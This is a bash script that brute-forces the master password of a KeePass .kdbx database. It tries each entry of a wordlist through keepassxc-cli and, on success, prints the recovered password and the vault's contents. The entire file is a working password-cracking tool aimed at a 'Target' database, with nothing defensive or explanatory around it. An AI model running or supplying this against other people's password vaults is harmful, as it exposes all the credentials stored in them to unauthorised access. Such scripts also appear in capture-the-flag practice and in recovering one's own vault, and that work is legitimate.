#!/bin/bash

if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <database.kdbx> <wordlist>"
    exit 1
fi

DB="$1"
WORDLIST="$2"

if [ ! -f "$DB" ]; then
    echo "[!] Database file not found: $DB"
    exit 1
fi

if [ ! -f "$WORDLIST" ]; then
    echo "[!] Wordlist not found: $WORDLIST"
    exit 1
fi

TOTAL=$(wc -l < "$WORDLIST")
COUNT=0

echo "[*] Target: $DB"
echo "[*] Wordlist: $WORDLIST ($TOTAL entries)"
echo "[*] Starting brute-force..."
echo ""

while IFS= read -r password || [ -n "$password" ]; do
    COUNT=$((COUNT + 1))

    if (( COUNT % 50 == 0 )); then
        echo -ne "\r[*] Trying $COUNT / $TOTAL..."
    fi

    RESULT=$(echo "$password" | flatpak run --command=keepassxc-cli org.keepassxc.KeePassXC ls "$DB" 2>&1)

    if [ $? -eq 0 ]; then
        echo -e "\r[+] PASSWORD FOUND after $COUNT attempts!"
        echo "[+] Password: $password"
        echo ""
        echo "[*] Database contents:"
        echo "$RESULT"
        exit 0
    fi
done < "$WORDLIST"

echo -e "\r[-] Exhausted wordlist ($TOTAL entries). Password not found."
exit 1